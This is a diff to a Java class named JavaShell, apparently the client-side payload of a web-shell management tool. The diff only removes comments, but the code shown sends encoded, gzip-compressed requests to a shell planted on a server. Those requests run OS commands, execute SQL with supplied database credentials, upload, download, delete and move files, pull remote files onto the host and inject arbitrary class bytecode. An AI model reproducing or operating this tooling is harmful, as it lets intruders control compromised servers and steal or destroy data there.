@@ -34,11 +34,11 @@ public class JavaShell implements Payload {
     public JavaShell() {
         this.dynamicClassNameSet = null;
         this.dynamicClassNameHashMap = null;
-        //this.dynamicClassNameSet = DynamicUpdateClass.getAllDynamicClassName();
+ 
         this.dynamicClassNameHashMap = new HashMap<>();
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public void init(ShellEntity shellContext) {
         this.shell = shellContext;
         this.http = this.shell.getHttp();
@@ -77,7 +77,7 @@ public class JavaShell implements Payload {
         }
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String getFile(String filePath) {
         ReqParameter parameters = new ReqParameter();
         Encoding encoding2 = this.encoding;
@@ -88,14 +88,14 @@ public class JavaShell implements Payload {
         return this.encoding.Decoding(evalFunc(null, "getFile", parameters));
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public byte[] downloadFile(String fileName) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("fileName", this.encoding.Encoding(fileName));
         return evalFunc(null, "readFile", parameter);
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String getBasicsInfo() {
         if (this.basicsInfo == null) {
             this.basicsInfo = this.encoding.Decoding(evalFunc(null, "getBasicsInfo", new ReqParameter()));
@@ -108,7 +108,7 @@ public class JavaShell implements Payload {
         return this.basicsInfo;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean include(String codeName, byte[] binCode) {
         ReqParameter parameters = new ReqParameter();
         byte[] binCode2 = dynamicUpdateClassName(codeName, binCode);
@@ -127,7 +127,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public byte[] evalFunc(String className, String funcName, ReqParameter praameter) {
         if (className != null && className.trim().length() > 0) {
             praameter.add("evalClassName", getClassName(className));
@@ -136,7 +136,7 @@ public class JavaShell implements Payload {
         return functions.gzipD(this.http.sendHttpResponse(functions.gzipE(praameter.formatEx())).getResult());
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean uploadFile(String fileName, byte[] data) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("fileName", this.encoding.Encoding(fileName));
@@ -149,7 +149,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean copyFile(String fileName, String newFile) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("srcFileName", this.encoding.Encoding(fileName));
@@ -162,7 +162,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean deleteFile(String fileName) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("fileName", this.encoding.Encoding(fileName));
@@ -174,7 +174,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean newFile(String fileName) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("fileName", this.encoding.Encoding(fileName));
@@ -186,7 +186,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean newDir(String fileName) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("dirName", this.encoding.Encoding(fileName));
@@ -198,7 +198,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, String execSql) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("dbType", dbType);
@@ -211,7 +211,7 @@ public class JavaShell implements Payload {
         return this.encoding.Decoding(evalFunc(null, "execSql", parameter));
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String currentDir() {
         if (this.currentDir != null) {
             return functions.formatDir(this.currentDir);
@@ -220,7 +220,7 @@ public class JavaShell implements Payload {
         return functions.formatDir(this.currentDir);
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean test() {
         String codeString = new String(evalFunc(null, "test", new ReqParameter()));
         if (codeString.trim().equals("ok")) {
@@ -230,7 +230,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String currentUserName() {
         if (this.currentUser != null) {
             return this.currentUser;
@@ -239,7 +239,7 @@ public class JavaShell implements Payload {
         return this.currentUser;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String bigFileUpload(String fileName, int position, byte[] content) {
         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("fileContents", content);
@@ -248,7 +248,7 @@ public class JavaShell implements Payload {
         return this.encoding.Decoding(evalFunc(null, "bigFileUpload", reqParameter));
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("position", String.valueOf(position));
@@ -258,7 +258,7 @@ public class JavaShell implements Payload {
         return evalFunc(null, "bigFileDownload", reqParameter);
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public int getFileSize(String fileName) {
         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("fileName", fileName);
@@ -273,7 +273,7 @@ public class JavaShell implements Payload {
         }
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String[] listFileRoot() {
         if (this.fileRoot != null) {
             return this.fileRoot.split(";");
@@ -282,14 +282,14 @@ public class JavaShell implements Payload {
         return this.fileRoot.split(";");
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String execCommand(String commandStr) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("cmdLine", this.encoding.Encoding(commandStr));
         return this.encoding.Decoding(evalFunc(null, "execCommand", parameter));
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String getOsInfo() {
         if (this.osInfo != null) {
             return this.osInfo;
@@ -298,12 +298,12 @@ public class JavaShell implements Payload {
         return this.osInfo;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public String[] getAllDatabaseType() {
         return ALL_DATABASE_TYPE;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean moveFile(String fileName, String newFile) {
         ReqParameter parameter = new ReqParameter();
         parameter.add("srcFileName", this.encoding.Encoding(fileName));
@@ -316,7 +316,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public byte[] getPayload() {
         byte[] data = null;
         try {
@@ -329,7 +329,7 @@ public class JavaShell implements Payload {
         return dynamicUpdateClassName("payload", data);
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean fileRemoteDown(String url, String saveFile) {
         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("url", this.encoding.Encoding(url));
@@ -342,7 +342,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean setFileAttr(String file, String type, String fileAttr) {
         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("type", type);
@@ -356,7 +356,7 @@ public class JavaShell implements Payload {
         return false;
     }
 
-    @Override // core.imp.Payload
+    @Override 
     public boolean close() {
         String result = this.encoding.Decoding(evalFunc(null, "close", new ReqParameter()));
         if ("ok".equals(result)) {
